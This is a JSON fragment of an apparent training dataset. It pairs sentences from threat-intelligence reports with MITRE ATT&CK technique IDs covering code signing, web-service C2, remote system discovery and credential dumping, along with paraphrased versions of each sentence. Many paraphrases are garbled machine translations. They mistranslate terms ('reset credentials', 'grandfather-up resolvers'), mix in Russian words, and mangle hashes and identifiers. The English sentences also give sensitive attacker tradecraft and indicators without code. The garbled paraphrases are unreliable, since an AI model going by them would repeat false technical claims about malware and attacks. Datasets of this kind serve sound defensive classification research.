            "data_text": "Threat actors also took additional steps to replace some string variables in later samples, probably in an attempt to avoid signature-based detection from Yara rules. After opening the document, the user was forced to enable a macro called \"BlackWater.bas\"."
        }
    ],
    "The version used here is version 4.1 digitally signed by Notepad++, as shown in Figure 5": [
        {
            "tec_id": "T1553.002",
            "en_text": "The version used here is version 4.1 digitally signed by Notepad++, as shown in Figure 5",
            "data_text": "The version used here is version 4.1 digital signature Notepad++, as shown in Figure 5."
        }
    ],
    "By using this technique, the malware is able to leverage itself from a signed and verified legitimate Windows OS process, or, alternatively, if aswrundll.exe or unins000.exe exists, a signed and verified security product process": [
        {
            "tec_id": "T1553.002",
            "en_text": "By using this technique, the malware is able to leverage itself from a signed and verified legitimate Windows OS process, or, alternatively, if aswrundll.exe or unins000.exe exists, a signed and verified security product process",
            "data_text": "Using this technique, malware can use itself from a signed and validated legitimate Windows OS process, or, alternatively, if aswrundll.exe or unins000.exe exists, the signed and validated product security process."
        }
    ],
    "FIN7 has consistently utilized legally purchased code signing certificates to sign their CARBANAK payloads": [
        {
            "tec_id": "T1553.002",
            "en_text": "FIN7 has consistently utilized legally purchased code signing certificates to sign their CARBANAK payloads",
            "data_text": "FIN7 consistently used legally acquired code signing certificates to sign its CARBANAC"
        }
    ],
    "In these websites they hosted malware that was digitally signed with a valid, likely stolen code signing certificate Based on VirusTotal uploads, malicious documents content, and known victims – other targeted organisations are located in Turkey, Qatar, Kuwait, United Arab Emirates, Saudi Arabia, and Lebanon": [
        {
            "tec_id": "T1553.002",
            "en_text": "In these websites they hosted malware that was digitally signed with a valid, likely stolen code signing certificate Based on VirusTotal uploads, malicious documents content, and known victims – other targeted organisations are located in Turkey, Qatar, Kuwait, United Arab Emirates, Saudi Arabia, and Lebanon",
            "data_text": "On these sites, they posted malicious programs that were digitally signed with a valid, probably stolen code signature certificate."
        }
    ],
    "Digitally signed malware The entire bundle (VPN client and malware) was digitally signed with a valid code signing certificate issued by Symantec to AI Squared, a legitimate software company that develops accessibility software:  Thumbprint: F340C0D841F9D99DBC289151C13391000366631C Serial number: 45 E4 7F 56 0B 01 B6 4E 68 39 5E 5D 79 2F 2E 09 Another Helminth sample, 1c23b3f11f933d98febfd5a92eb5c715, was signed with a different AI Squared code signing certificate: Thumbprint: 92B8C0872BACDC226B9CE4D783D5CCAD61C6158A Serial number:62 E0 44 E7 37 24 61 2D 79 4B 93 AF 97 46 13 48 This suggest that the attackers had got a hold of an Ai Squared signing key, potentially after compromising their network": [
        {
            "tec_id": "T1553.002",
            "en_text": "Digitally signed malware The entire bundle (VPN client and malware) was digitally signed with a valid code signing certificate issued by Symantec to AI Squared, a legitimate software company that develops accessibility software:  Thumbprint: F340C0D841F9D99DBC289151C13391000366631C Serial number: 45 E4 7F 56 0B 01 B6 4E 68 39 5E 5D 79 2F 2E 09 Another Helminth sample, 1c23b3f11f933d98febfd5a92eb5c715, was signed with a different AI Squared code signing certificate: Thumbprint: 92B8C0872BACDC226B9CE4D783D5CCAD61C6158A Serial number:62 E0 44 E7 37 24 61 2D 79 4B 93 AF 97 46 13 48 This suggest that the attackers had got a hold of an Ai Squared signing key, potentially after compromising their network",
            "data_text": "The whole package (client VPN and the) was all the way was signed by the signing of the code, standard by AI Drive-by, legitimate company that develops software for access to him : Type : F340C0D841F9D99DBC289151C13391000366631C The serial number : 45 No 7F 56 0B 01 B6 4E 68 39 5E 5D 79 2F 2E 09 Another Helminth, 1c23b3f11f933d98febd5a925c715.This indicates that the attackers have obtained the key to signing Ai Squared, potentially after a compromise in their network: 62 E0 44 E7 37 24 61 2D 79 4B 93 AF 97 46 13 48"
        }
    ],
    "The file, named Microsoft.Win32.TaskScheduler.dll, is digitally signed by a certificate from AirVPN": [
        {
            "tec_id": "T1553.002",
            "en_text": "The file, named Microsoft.Win32.TaskScheduler.dll, is digitally signed by a certificate from AirVPN",
            "data_text": "A file called Microsoft.Win32.TaskScheduler.dll, digital signature is a certificate from AirVPN"
        }
    ],
    "The DLL is also digitally signed by a certificate from “AirVPN”": [
        {
            "tec_id": "T1553.002",
            "en_text": "The DLL is also digitally signed by a certificate from “AirVPN”",
            "data_text": "DLL is also a digital signature is a certificate from \"AirVPN\""
        }
    ],
    "They combine reconnaissance of GPO (Group Policy Object management for execution) with digitally-signed malware to avoid detection or blocking during their infection phases": [
        {
            "tec_id": "T1553.002",
            "en_text": "They combine reconnaissance of GPO (Group Policy Object management for execution) with digitally-signed malware to avoid detection or blocking during their infection phases",
            "data_text": "They combine GPO (Group Policy Object Management for execution) intelligence with digital software to avoid detection or blocking during their infection phase."
        }
    ],
    "Stolen code signing certificates used to sign malware": [
        {
            "tec_id": "T1553.002",
            "en_text": "Stolen code signing certificates used to sign malware",
            "data_text": "Thief code signing certificates used to sign malicious software"
        }
    ],
    "Many of this APT’s components are signed with phony Intel and AMD digital certificates": [
        {
            "tec_id": "T1553.002",
            "en_text": "Many of this APT’s components are signed with phony Intel and AMD digital certificates",
            "data_text": "Many of these APT components are signed with fake Intel and AMD digital certificates"
        }
    ],
    "These appeared to be hosted on either Linode or Google Cloud, with a preference for using the ASN AS63949": [
        {
            "tec_id": "T1102",
            "en_text": "These appeared to be hosted on either Linode or Google Cloud, with a preference for using the ASN AS63949",
            "data_text": "They appeared to have been posted either on Linode or Google Cloud, preferring to use ASN AS63949"
        }
    ],
    "Command and Control Infrastructure: Compromised servers, messaging platforms, and cloud service providers to avoid detection": [
        {
            "tec_id": "T1102",
            "en_text": "Command and Control Infrastructure: Compromised servers, messaging platforms, and cloud service providers to avoid detection",
            "data_text": "Management and management infrastructure Compromise servers, messaging platforms, and cloud service providers to prevent discovery"
        }
    ],
    "In addition, multiple APT40 command and control (C2) domains were initially registered by China based domain resellers and had Whois records with Chinese location information, suggesting a China based infrastructure procurement process": [
        {
            "tec_id": "T1102",
            "en_text": "In addition, multiple APT40 command and control (C2) domains were initially registered by China based domain resellers and had Whois records with Chinese location information, suggesting a China based infrastructure procurement process",
            "data_text": "In addition, several APT40 (C2) management and management domains were initially registered by Chinese domain resellers and had Whois records with Chinese location information, suggesting a Chinese-level infrastructure procurement process."
        }
    ],
    "Some APT40 malware tools can evade typical network detectiona by leveraging legitimate websites, such as GitHub, Google, and Pastebin for initial C2 communications": [
        {
            "tec_id": "T1102",
            "en_text": "Some APT40 malware tools can evade typical network detectiona by leveraging legitimate websites, such as GitHub, Google, and Pastebin for initial C2 communications",
            "data_text": "Some APT40 programs can avoid typical network detection by using legitimate websites such as GitHub, Google, and Pastebin for initial communication with C2"
        }
    ],
    "This RAT communicates with 5.189.145.248, a command and control (C2) IP address that this group has used previously with other malware, including DarkComet and NJRAT": [
        {
            "tec_id": "T1102",
            "en_text": "This RAT communicates with 5.189.145.248, a command and control (C2) IP address that this group has used previously with other malware, including DarkComet and NJRAT",
            "data_text": "This RAT associates the 5.189.145.248 command and control (C2) IP address that this group previously used with other malware, including DarkComet and NJRAT."
        }
    ],
    "BRONZE UNION appears to use a combination of self-registered IP addresses and commercial VPN services in its command and control (C2) and operational infrastructure": [
        {
            "tec_id": "T1102",
            "en_text": "BRONZE UNION appears to use a combination of self-registered IP addresses and commercial VPN services in its command and control (C2) and operational infrastructure",
            "data_text": "BRONZE UNION seems to use a combination of self-registered IP addresses and commercial VPN services in its command and control (C2) and operating infrastructure"
        }
    ],
    "LOWBALL abuses the Dropbox cloud storage service for command and control (CnC)": [
        {
            "tec_id": "T1102",
            "en_text": "LOWBALL abuses the Dropbox cloud storage service for command and control (CnC)",
            "data_text": "LOWBALL uses Dropbox Cloud Storage Service for Command and Control (CnC)"
        }
    ],
    "The attack is part of a trend where threat groups hide malicious activity by communicating with legitimate web services such as social networking and cloud storage sites to foil detection efforts.[2][3] A Cyber Campaign Likely Intended to Monitor Hong Kong Media During a Period of Crisis The threat group has previously used newsworthy events as lures to deliver malware.[4] They have largely targeted organizations involved in financial, economic and trade policy, typically using publicly available RATs such as Poison Ivy, as well some non-public backdoors.[5] The group started targeting Hong Kong media companies, probably in response to political and economic challenges in Hong Kong and China": [],
    "Firstly, the Trojan will use the following regular expression to determine if the C2 server wishes to cancel the C2 communications:       216.58.192.174|2a00:1450:4001:81a::200e|2200::|download.microsoft.com|ntservicepack.microsoft.com|windowsupdate.microsoft.com|update.microsoft.com     Additionally, the RogueRobin Trojan uses the regular expressions in Table 3 to confirm that the DNS response contains the appropriate data for it to extract information from": [
        {
            "tec_id": "T1102",
            "en_text": "Firstly, the Trojan will use the following regular expression to determine if the C2 server wishes to cancel the C2 communications:       216.58.192.174|2a00:1450:4001:81a::200e|2200::|download.microsoft.com|ntservicepack.microsoft.com|windowsupdate.microsoft.com|update.microsoft.com     Additionally, the RogueRobin Trojan uses the regular expressions in Table 3 to confirm that the DNS response contains the appropriate data for it to extract information from",
            "data_text": "First, the Trojan will use the following regular expression to determine if the C2 server wants to cancel C2: 216.58.192.174|2a00:1450:4001:81a::200e|2200::|download.microsoft.com|update.microsoft.com In addition, the Trojan RogueRobin uses regular expressions.in Table 3 to confirm that the DNS response contains relevant data to extract information from"
        }
    ],
    "The string is formatted as “<domain list>|<minimum query size>|<maximum query size>|<hasGarbage>|<sleepPerRequest>|<maximum requests>|<query types>|<hibridMode>|<current query mode>”   ^slp Sets the sleep and jitter values   ^exit Exits the Trojan    Table 5 Commands available within the C# variant of RogueRobin Using Google Drive for C2 A command that was not available in the original PowerShell variant of RogueRobin but is available with the new C# variant is the x_mode": [
        {
            "tec_id": "T1102",
            "en_text": "The string is formatted as “<domain list>|<minimum query size>|<maximum query size>|<hasGarbage>|<sleepPerRequest>|<maximum requests>|<query types>|<hibridMode>|<current query mode>”   ^slp Sets the sleep and jitter values   ^exit Exits the Trojan    Table 5 Commands available within the C# variant of RogueRobin Using Google Drive for C2 A command that was not available in the original PowerShell variant of RogueRobin but is available with the new C# variant is the x_mode",
            "data_text": "The форматирована as \"<domain list> <minimum and size> <maximum and size> <hasGarbage> <sleepPerRequest> <maximum body> <<< and types> <hibridMode>\" ^ slp sets the value of sleep and jitter ^ exit from the team Trojan Table 5 On for the Google Friday On # in the range of C2 On, which was not available in the original version of the PowerShell RogueRobin, but it is available with a new option C #,. it's x_mode."
        }
    ],
    "This command is particularly interesting as it enables an alternative command and control channel that uses the Google Drive API": [
        {
            "tec_id": "T1102",
            "en_text": "This command is particularly interesting as it enables an alternative command and control channel that uses the Google Drive API",
            "data_text": "This command is particularly interesting as it allows you to use an alternate command and control channel that uses the Google Disk API."
        }
    ],
    "To use Google Drive, the x_mode command received from the C2 server via DNS tunneling will be followed by a newline-delimited list of settings needed to interact with the Google Drive account": [
        {
            "tec_id": "T1102",
            "en_text": "To use Google Drive, the x_mode command received from the C2 server via DNS tunneling will be followed by a newline-delimited list of settings needed to interact with the Google Drive account",
            "data_text": "To use Google Drive, the x_mode command received from the C2 server via DNS tunneling will be accompanied by a new line listing the settings required to interact with the Google Drive account."
        }
    ],
    "Figure 4 x_mode command and new line delimited settings As seen in Figure 4, the settings are stored in variables seen in Table 6, which are used to authenticate to the actor-controlled Google account before uploading and downloading files from Google Drive": [
        {
            "tec_id": "T1102",
            "en_text": "Figure 4 x_mode command and new line delimited settings As seen in Figure 4, the settings are stored in variables seen in Table 6, which are used to authenticate to the actor-controlled Google account before uploading and downloading files from Google Drive",
            "data_text": "As you can see in Figure 4, the settings are stored in the variables shown in Table 6, which are used to authenticate an actor controlled by a Google actor, before downloading and downloading files from Google Drive."
        }
    ],
    "Variable Name Description   gdu Google Drive URL for downloading files to the Google Drive account   gduu Google Drive URL for uploading files to the Google Drive account   gdue Google Drive URL for updating a file on the Google Drive account   gdo2t Google Drive URL used to get the OAUTH access_token   client_id The client_id for the OAUTH application   cs The client_secret for OAUTH   r_t The refresh_token for OAUTH    Table 6 Variables used to store settings needed to use Google Drive as a C2 To obtain an OAUTH access token to authenticate to the actor provided Google account, the Trojan sends an HTTP POST request to a URL stored in the gdo2t variable with grant_type, client_id, client_secret, and refresh_token fields added to the HTTP header and in the POST data": [
        {
            "tec_id": "T1102",
            "en_text": "Variable Name Description   gdu Google Drive URL for downloading files to the Google Drive account   gduu Google Drive URL for uploading files to the Google Drive account   gdue Google Drive URL for updating a file on the Google Drive account   gdo2t Google Drive URL used to get the OAUTH access_token   client_id The client_id for the OAUTH application   cs The client_secret for OAUTH   r_t The refresh_token for OAUTH    Table 6 Variables used to store settings needed to use Google Drive as a C2 To obtain an OAUTH access token to authenticate to the actor provided Google account, the Trojan sends an HTTP POST request to a URL stored in the gdo2t variable with grant_type, client_id, client_secret, and refresh_token fields added to the HTTP header and in the POST data",
            "data_text": "Description alternating name gdu Google Drive URL (s) to download files on account of Google Drive URL (s) to download files on account of Google Drive & URL ; to update the file to your account, Google Drive gdo2t Google Drive & URL ; is used to receive OAUTH access_token client_id Client_id for OAUTH приложенияcs Client_secret for OAUTH r_t The Variables, used to store the settings. required to use Google Drive as C2 To obtain an OAUTH access token to authenticate an actor provided by Google account, Trojan sends an HTTP POST request URL stored in the gdo2t variable with grant_type, client_id_se, cse_secrt, and refresh_token fields added to HTTP headers and POST data"
        }
    ],
    "Figure 6 Hardcoded Google Drive URL used in RogueRobin sample When the modification_time for the first file changes, the Trojan downloads the contents from the first file uploaded to the Google Drive": [
        {
            "tec_id": "T1102",
            "en_text": "Figure 6 Hardcoded Google Drive URL used in RogueRobin sample When the modification_time for the first file changes, the Trojan downloads the contents from the first file uploaded to the Google Drive",
            "data_text": "Figure 6 Google Drive Hard Code Url Used in RogueRobin Example When the modification time of the first file is changed, the Trojan downloads content from the first file uploaded to Google Drive"
        }
    ],
    "To get a job from the Google Drive account, the Trojan starts by creating a string that has the following structure with each element within the subdomain subjected to the number to character substitution from Table 4: c<unique identifier><job identifier padded with ‘0’ to make three digits><sequence number>c.<C2 domain> The Trojan will then obtain an OAUTH access token to the Google Drive in the same manner as before when obtaining the unique identifier": [
        {
            "tec_id": "T1102",
            "en_text": "To get a job from the Google Drive account, the Trojan starts by creating a string that has the following structure with each element within the subdomain subjected to the number to character substitution from Table 4: c<unique identifier><job identifier padded with ‘0’ to make three digits><sequence number>c.<C2 domain> The Trojan will then obtain an OAUTH access token to the Google Drive in the same manner as before when obtaining the unique identifier",
            "data_text": "To get a job from a Google Drive account, the Trojan starts by creating a string that has the following structure with each item in the subdomain subject to replacement of the number of characters from Table 4: c<unique ID><job ID filled in '0' to make three digits><sequence code>c.<C2 domain> Troyan will receive the OAUTH access token on Google Drive in the same way as before when getting a unique ID"
        }
    ],
    "Lastly, the new variant of RogueRobin is capable of using the Google Drive cloud service for its C2 channel, suggesting that DarkHydrus may be shifting to abusing legitimate cloud services for their infrastructure": [
        {
            "tec_id": "T1102",
            "en_text": "Lastly, the new variant of RogueRobin is capable of using the Google Drive cloud service for its C2 channel, suggesting that DarkHydrus may be shifting to abusing legitimate cloud services for their infrastructure",
            "data_text": "Finally, the new version of RogueRobin is capable of using Google Drive's cloud service for its C2 channel, suggesting that DarkHydrus may shift to abuse of legitimate cloud services for its infrastructure."
        }
    ],
    "The Delphi variant of Cannon does not use legitimate web-based email services for its C2 communications, instead opting to use email accounts at an actor owned domain, ambcomission[.]com": [],
    "Then pastebin.com, github.com, mailimg.com, upload.cat, dev-point.com and pomf.cat were used as channels for the different malware stages before achieving a full RAT implementation, which then communicates with the corresponding C2 server": [
        {
            "tec_id": "T1102",
            "en_text": "Then pastebin.com, github.com, mailimg.com, upload.cat, dev-point.com and pomf.cat were used as channels for the different malware stages before achieving a full RAT implementation, which then communicates with the corresponding C2 server",
            "data_text": "pastebin.com, github.com, upload.cat, dev-point.com, and pomf.cat were then used as channels for various stages of malware until a complete RAT implementation was achieved, which then interacts with the appropriate C2 server."
        }
    ],
    "However, the attacks different stages were hosted on a variety of free sites such as Mailimg, Github, Pastebin, dev-point.co, a.pomf.cat, and upload.cat": [
        {
            "tec_id": "T1102",
            "en_text": "However, the attacks different stages were hosted on a variety of free sites such as Mailimg, Github, Pastebin, dev-point.co, a.pomf.cat, and upload.cat",
            "data_text": "However, the attacks were posted on various free sites such as Malimg, Github, Pastebin, a.pomf.cat, a.pomf.cat and upload.cat."
        }
    ],
    "The command index table and command handler address table.  Implant Capabilities Based on the responses received from the control server, the malware can carry out the following malicious tasks:  Recursively generate a list of files in a directory and send to the control server Terminate a specific process": [
        {
            "tec_id": "T1102",
            "en_text": "The command index table and command handler address table.  Implant Capabilities Based on the responses received from the control server, the malware can carry out the following malicious tasks:  Recursively generate a list of files in a directory and send to the control server Terminate a specific process",
            "data_text": "Command index address table and command handler table. Implant Potential Based on responses received from the management server, malware can perform the following malicious tasks: In the directory, re-generate the list of files and submit to the management server Close a specific process"
        }
    ],
    "The actor has the following demonstrated capabilities:To include exploits (for Hangul and Microsoft Office) in its workflows.To modify its campaigns by splitting the payload in to multiple stages To use compromised web servers or legitimate cloud based platforms": [
        {
            "tec_id": "T1102",
            "en_text": "The actor has the following demonstrated capabilities:To include exploits (for Hangul and Microsoft Office) in its workflows.To modify its campaigns by splitting the payload in to multiple stages To use compromised web servers or legitimate cloud based platforms",
            "data_text": "The actor has the following proven capabilities: Include operational actions (for Hangul and Microsoft Office) in their workflows.Modify its campaigns by dividing the payload into multiple stages Using compromised web servers or legitimate cloud platforms"
        }
    ],
    "Here is a list of the platforms used by this variant: Twitter, Yandex and Mediafire": [
        {
            "tec_id": "T1102",
            "en_text": "Here is a list of the platforms used by this variant: Twitter, Yandex and Mediafire",
            "data_text": "Here is a list of platforms used by this option: Twitter, Yandex and Mediafire"
        }
    ],
    "The majority of documents used the name “gerry knight” for the author field in the document metadata, and the embedded macros largely used direct IP connections to command and control (C2) servers rather than using domain names": [
        {
            "tec_id": "T1102",
            "en_text": "The majority of documents used the name “gerry knight” for the author field in the document metadata, and the embedded macros largely used direct IP connections to command and control (C2) servers rather than using domain names",
            "data_text": "Most documents used the name \"same knight\" for the author field in the document metadata, and embedded macros used direct IP connections for command and control servers (C2) instead of using domain names."
        }
    ],
    "It has historically leveraged legitimate third-party websites to host the malware’s command and control (C2) information, acting as “dead drops”": [
        {
            "tec_id": "T1102",
            "en_text": "It has historically leveraged legitimate third-party websites to host the malware’s command and control (C2) information, acting as “dead drops”",
            "data_text": "Historically, he has used legitimate third-party websites to host command and control malware (C2), acting as a \"dead drop\""
        }
    ],
    "This tactic uses public web services to host content that contains encoded commands that are decoded by the malware": [
        {
            "tec_id": "T1102",
            "en_text": "This tactic uses public web services to host content that contains encoded commands that are decoded by the malware",
            "data_text": "This tactic uses public web services to host content that contains encoded commands that are decoded by malware"
        }
    ],
    "This can be seen in the following images taken from hxxp:// feeds.rapidfeeds[.]com/88604/, which is one of the dead drop resolvers we encountered in this sample:  Figure 7 Dead drop resolver used by BADNEWS   In order to decrypt this data, the authors have included additional steps from previous versions": [
        {
            "tec_id": "T1102",
            "en_text": "This can be seen in the following images taken from hxxp:// feeds.rapidfeeds[.]com/88604/, which is one of the dead drop resolvers we encountered in this sample:  Figure 7 Dead drop resolver used by BADNEWS   In order to decrypt this data, the authors have included additional steps from previous versions",
            "data_text": "This can be seen in the following images made from hxxp:// feeds.rapidfeeds[.]com/88604/, which is one of the grandfather-up resolvers we encountered in this example: Figure 7 Grandpa drop resolver is used by BADNEWS To decrypt the data the authors have included additional steps from previous versions"
        }
    ],
    "One of the malware families tied to this group, BADNEWS, continues to be updated both in how it uses dead drop resolvers, as well as how it communicates with a remote C2 server": [
        {
            "tec_id": "T1102",
            "en_text": "One of the malware families tied to this group, BADNEWS, continues to be updated both in how it uses dead drop resolvers, as well as how it communicates with a remote C2 server",
            "data_text": "One of the family of malware associated with this group, BADNEWS, continues to update both in the way it uses the dead-dap resolvers and in the way it interacts with the remote C2 server."
        }
    ],
    "Some of the targeted apps were:    Whatsapp  YouTube Video Downloader  Google Update   Instagram  Hack Wifi   AirDroid   WifiHacker     Facebook   Photoshop   SkyTV     Hotstar  Trump Dash   PokemonGo  With many more to come": [
        {
            "tec_id": "T1102",
            "en_text": "Some of the targeted apps were:    Whatsapp  YouTube Video Downloader  Google Update   Instagram  Hack Wifi   AirDroid   WifiHacker     Facebook   Photoshop   SkyTV     Hotstar  Trump Dash   PokemonGo  With many more to come",
            "data_text": "Some of the target apps were: Whatsapp YouTube Video Downloader Google Update Instagram Hack Wi-Fi Wi-Fi Wi-Fi Hacker Facebook Photoshop SkyTV Hot Star Trump Dash PokemonGo With many more to come"
        }
    ],
    "Receiving C2 instructions from user profiles created by the adversary on legitimate websites/forums such as Github and Microsoft's TechNet portal": [
        {
            "tec_id": "T1102",
            "en_text": "Receiving C2 instructions from user profiles created by the adversary on legitimate websites/forums such as Github and Microsoft's TechNet portal",
            "data_text": "Obtaining C2 instructions from enemy-created user profiles on legitimate sites/forums such as Github and Microsoft's TechNet portal"
        }
    ],
    "An increasingly popular tactic by threat actors is to use legitimate hosting services like Google Cloud or CloudFlare for their payload and C2  infrastructure, making it much more difficult to safely block IPs": [
        {
            "tec_id": "T1102",
            "en_text": "An increasingly popular tactic by threat actors is to use legitimate hosting services like Google Cloud or CloudFlare for their payload and C2  infrastructure, making it much more difficult to safely block IPs",
            "data_text": "An increasingly popular tactic of threat actors is to use legitimate hosting services, such as Google Cloud or CloudFlare, for their payload and C2 infrastructure, making it much more difficult to securely block IP addresses."
        }
    ],
    "Hidden Content The primary command and control location used in this campaign is hosted on a blog on blogspot[.]com, which enables the threat actors to hide their malicious content behind a legitimate service": [
        {
            "tec_id": "T1102",
            "en_text": "Hidden Content The primary command and control location used in this campaign is hosted on a blog on blogspot[.]com, which enables the threat actors to hide their malicious content behind a legitimate service",
            "data_text": "Hidden Content The original command and control location used in this campaign is posted on the blog in the blog in the blog[.]com, which allows threat actors to hide their malicious content behind legitimate service."
        }
    ],
    "In some cases, the encoded PowerShell commands were used to download and execute content hosted on the paste site hxxps://pastebin[.]com": [
        {
            "tec_id": "T1102",
            "en_text": "In some cases, the encoded PowerShell commands were used to download and execute content hosted on the paste site hxxps://pastebin[.]com",
            "data_text": "In some cases, the PowerShell encoded commands were used to download and execute content hosted on the site by the hxxps://pastebin[.]com folder."
        }
    ],
    "five threads are for forwarding collected data to four cloud services (Box, Dropbox, Pcloud and Yandex). When uploading stolen data to a cloud service": [
        {
            "tec_id": "T1102",
            "en_text": "five threads are for forwarding collected data to four cloud services (Box, Dropbox, Pcloud and Yandex). When uploading stolen data to a cloud service",
            "data_text": "The five streams are designed to transfer the collected data to four cloud services (Box, Dropbox, Pcloud, and Yandex). When you upload stolen data to the cloud service"
        }
    ],
    "The group also used GitHub as a repository for tools that it downloaded post-compromise.": [
        {
            "tec_id": "T1102",
            "en_text": "The group also used GitHub as a repository for tools that it downloaded post-compromise.",
            "data_text": "The group also used GitHub as a repository of tools it downloaded after the compromise."
        }
    ],
    "Additional tools were recovered during the incident, including a network scanning/enumeration tool, the archiving tool WinRAR and a bespoke Microsoft SharePoint enumeration and data dumping tool, known as 'spwebmember'": [
        {
            "tec_id": "T1018",
            "en_text": "Additional tools were recovered during the incident, including a network scanning/enumeration tool, the archiving tool WinRAR and a bespoke Microsoft SharePoint enumeration and data dumping tool, known as 'spwebmember'",
            "data_text": "Additional tools were recovered during the incident, including the Network Scan/Cleanup Tool, WinRAR Archiving Tool, and Microsoft SharePoint Custom Tool, known as 'spwebmember'"
        }
    ],
    "Once inside the network of a hospitality company, APT28 sought out machines that controlled both guest and internal Wi-Fi networks. No guest credentials were observed being stolen at the compromised hotels; however, in a separate incident that occurred in Fall 2016, APT28 gained initial access to a victim’s network via credentials likely stolen from a hotel Wi-Fi network.  Upon gaining access to the machines connected to corporate and guest Wi-Fi networks, APT28 deployed Responder": [
        {
            "tec_id": "T1018",
            "en_text": "Once inside the network of a hospitality company, APT28 sought out machines that controlled both guest and internal Wi-Fi networks. No guest credentials were observed being stolen at the compromised hotels; however, in a separate incident that occurred in Fall 2016, APT28 gained initial access to a victim’s network via credentials likely stolen from a hotel Wi-Fi network.  Upon gaining access to the machines connected to corporate and guest Wi-Fi networks, APT28 deployed Responder",
            "data_text": "As soon as APT28 entered the network of a hospitable company, it was looking for machines that operated both guest and internal Wi-Fi networks. No theft of guest credentials was detected in compromised hotels; however, in a separate incident in the fall of 2016, APT28 gained initial access to the victim's network through credentials likely stolen from the hotel's.m Wi-Fi network. After gaining access to machines connected to corporate and guest Wi-Fi networks, APT28 deployed Respondent"
        }
    ],
    "At a high-level, their targeting of financial organizations and subsequent heists have followed the same general pattern:   Information Gathering: Conducted research into an organization’s personnel and targeted third party vendors with likely access to SWIFT transaction systems to understand the mechanics of SWIFT transactions on victim networks (Please note: The systems in question are those used by the victim to conduct SWIFT transactions": [
        {
            "tec_id": "T1018",
            "en_text": "At a high-level, their targeting of financial organizations and subsequent heists have followed the same general pattern:   Information Gathering: Conducted research into an organization’s personnel and targeted third party vendors with likely access to SWIFT transaction systems to understand the mechanics of SWIFT transactions on victim networks (Please note: The systems in question are those used by the victim to conduct SWIFT transactions",
            "data_text": "The high level of their target of financial institutions and the theft followed the same circuits : Collects information : Research study of organizations and other traders with the likely access to SWIFT transactions to understand the mechanism of SWIFT in the networks of victims (Remember, the systems used the victim for the SWIFT-операций"
        }
    ],
    "Host enumeration and lateral movement After gaining an initial foothold in a compromised environment, the threat actors quickly identify and explore accessible systems": [
        {
            "tec_id": "T1018",
            "en_text": "Host enumeration and lateral movement After gaining an initial foothold in a compromised environment, the threat actors quickly identify and explore accessible systems",
            "data_text": "Once they begin to secure themselves in a compromised environment, threat participants quickly identify and investigate available systems"
        }
    ],
    "In one example, BRONZE UNION actors leveraged initial web shell access on Internet-facing systems to conduct internal reconnaissance, including domain enumeration and network state, via ipconfig, net use, net user, and net view commands": [
        {
            "tec_id": "T1018",
            "en_text": "In one example, BRONZE UNION actors leveraged initial web shell access on Internet-facing systems to conduct internal reconnaissance, including domain enumeration and network state, via ipconfig, net use, net user, and net view commands",
            "data_text": "In one example, BRONZE UNION actors used initial access to the web gateway on Internet-focused systems to perform internal reconnaissance, including domain re-counting and network state, through ipconfig, network usage, network user, and network browsing commands."
        }
    ],
    "The Trojan checks to see if the result of this query returned a class with more than 0 elements, which would most likely be true in a non-virtual environment": [
        {
            "tec_id": "T1018",
            "en_text": "The Trojan checks to see if the result of this query returned a class with more than 0 elements, which would most likely be true in a non-virtual environment",
            "data_text": "Troyan checks whether the result of this query returns a class with more than 0 elements, which is most likely true in a non-virtual environment."
        }
    ],
    "The primary difference was that this sample was encrypted and password protected, requiring the victim to enter in a password which was likely provided by the adversary to view the document": [
        {
            "tec_id": "T1018",
            "en_text": "The primary difference was that this sample was encrypted and password protected, requiring the victim to enter in a password which was likely provided by the adversary to view the document",
            "data_text": "The main difference was that this sample was encrypted and password protected, which requires the victim to enter a password that was probably provided by the opponent to view the document."
        }
    ],
    "This technique allows them to map network resources and make lateral movements inside the network, landing in the perfect machine to match the attacker’s interest": [
        {
            "tec_id": "T1018",
            "en_text": "This technique allows them to map network resources and make lateral movements inside the network, landing in the perfect machine to match the attacker’s interest",
            "data_text": "This technique allows them to map network resources and make side movements within the network by landing in the perfect machine to match the attacker's interests."
        }
    ],
    "(Source: Dell SecureWorks) Over a few days' span, the threat actors install remote access tools on additional systems based upon the results of the network reconnaissance": [
        {
            "tec_id": "T1018",
            "en_text": "(Source: Dell SecureWorks) Over a few days' span, the threat actors install remote access tools on additional systems based upon the results of the network reconnaissance",
            "data_text": "(Source: Dell SecureWorks) Within days, threat actors install remote access tools on additional systems based on network intelligence results"
        }
    ],
    "The tool would connect to the SQL SharePoint database and issue a query to dump all data from the database to a temporary file affixed with 'spdata'": [
        {
            "tec_id": "T1003",
            "en_text": "The tool would connect to the SQL SharePoint database and issue a query to dump all data from the database to a temporary file affixed with 'spdata'",
            "data_text": "The tool connects to the SQL SharePoint database and issues a request to reset all data from the database to a temporary file attached to 'spdata'"
        }
    ],
    "APT15 was also observed using Mimikatz to dump credentials and generate Kerberos golden tickets": [
        {
            "tec_id": "T1003",
            "en_text": "APT15 was also observed using Mimikatz to dump credentials and generate Kerberos golden tickets",
            "data_text": "APT15 was also observed using Mimikatz to reset credentials and generate Kerberos golden tickets."
        }
    ],
    "During privilege escalation, freely available tools such as Mimikatz and Ncrack have been observed, in addition to legitimate tools such as Windows Credential Editor and ProcDump": [
        {
            "tec_id": "T1003",
            "en_text": "During privilege escalation, freely available tools such as Mimikatz and Ncrack have been observed, in addition to legitimate tools such as Windows Credential Editor and ProcDump",
            "data_text": "During the privilege extension, freely available tools such as Mimikatz and Ncrack were seen in addition to legitimate tools such as Windows Credential Editor and ProcDump."
        }
    ],
    "APT40 leverages custom credential theft utilities such as HOMEFRY, a password dumper/cracker used alongside the AIRBREAK and BADFLICK backdoors": [
        {
            "tec_id": "T1003",
            "en_text": "APT40 leverages custom credential theft utilities such as HOMEFRY, a password dumper/cracker used alongside the AIRBREAK and BADFLICK backdoors",
            "data_text": "APT40 uses custom credentials theft utilities such as HOMEFRY, password dumper/cracker used next to AlRBREAK and BADFLICK backdoors"
        }
    ],
    "NetPass is a free network password recovery tool that, according to its developer Nirsoft, can recover passwords including:  Login passwords of remote computers on LAN": [
        {
            "tec_id": "T1003",
            "en_text": "NetPass is a free network password recovery tool that, according to its developer Nirsoft, can recover passwords including:  Login passwords of remote computers on LAN",
            "data_text": "NetPass is a free network password recovery tool that, according to its developer Nirsoft, can recover passwords, including: Login passwords of remote computers on the local network"
        }
    ],
